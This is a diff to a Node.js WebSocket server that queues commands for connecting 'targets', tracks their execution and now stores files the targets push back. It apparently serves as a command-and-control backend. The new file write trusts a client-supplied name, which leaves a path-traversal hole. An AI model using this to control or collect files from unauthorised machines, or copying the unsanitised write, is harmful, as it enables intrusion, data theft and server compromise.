@@ -2,12 +2,16 @@ import express from "express";
 import { WebSocketServer } from "ws";
 import fs from "fs";
 import { v4 as uuidv4 } from "uuid";
+import path from "path";
 
 const app = express();
 app.use(express.json());
 
 const PORT = process.env.PORT || 3000;
 const COMMAND_FILE = "./commands.json";
+const RECEIVED_DIR = "./received_files";
+
+if (!fs.existsSync(RECEIVED_DIR)) fs.mkdirSync(RECEIVED_DIR, { recursive: true });
 
 let targets = { targets: {} };
 
@@ -31,7 +35,7 @@ const clients = new Map(); // key: targetName, value: ws
 wss.on("connection", (ws, req) => {
   let targetName = null;
 
-  ws.on("message", (message) => {
+  ws.on("message", async (message) => {
     try {
       const data = JSON.parse(message);
 
@@ -40,7 +44,7 @@ wss.on("connection", (ws, req) => {
         clients.set(targetName, ws);
         console.log(`✅ Target connected: ${targetName}`);
 
-        // send all pending commands
+        // send pending commands
         if (targets.targets[targetName]) {
           targets.targets[targetName].forEach(cmd => {
             if (cmd.status === "pending") {
@@ -56,12 +60,20 @@ wss.on("connection", (ws, req) => {
         const status = data.status;
         const cmd = targets.targets[targetName].find(c => c.id === cmdId);
         if (cmd) cmd.status = status;
+
+        // If it's a file push from client
+        if (data.result && data.result.file_b64 && data.result.name) {
+          const filePath = path.join(RECEIVED_DIR, data.result.name);
+          fs.writeFileSync(filePath, Buffer.from(data.result.file_b64, "base64"));
+          console.log(`📁 Received file: ${data.result.name} from ${targetName}`);
+        }
+
         saveCommands();
         console.log(`Target ${targetName} executed command ${cmdId}: ${status}`);
       }
 
     } catch (err) {
-      console.error("Invalid message:", message);
+      console.error("Invalid message:", message, err);
     }
   });
 
@@ -115,6 +127,7 @@ app.get("/status/:target", (req, res) => {
 });
 
 const server = app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+
 server.on("upgrade", (req, socket, head) => {
   wss.handleUpgrade(req, socket, head, (ws) => {
     wss.emit("connection", ws, req);
